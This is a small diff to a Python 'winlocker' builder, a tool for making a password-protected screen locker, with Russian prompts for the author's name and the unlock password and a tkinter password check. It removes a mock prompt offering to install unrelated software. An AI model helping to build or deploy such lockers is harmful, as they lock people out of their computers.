@@ -23,7 +23,6 @@ print(r"""
 """)
 win = input("введите от кого будет сделан винлокер: ")
 parol = input("введите пароль от винлокера: ")
-input('установить яндекс,яндекс игры, майнкрафт, впн?(я их и так установлю):')
 
 def check_input(event=None):
     user_input = entry.get().strip()  
@@ -86,4 +85,5 @@ label.pack()
 
 
 root.mainloop()
+
 
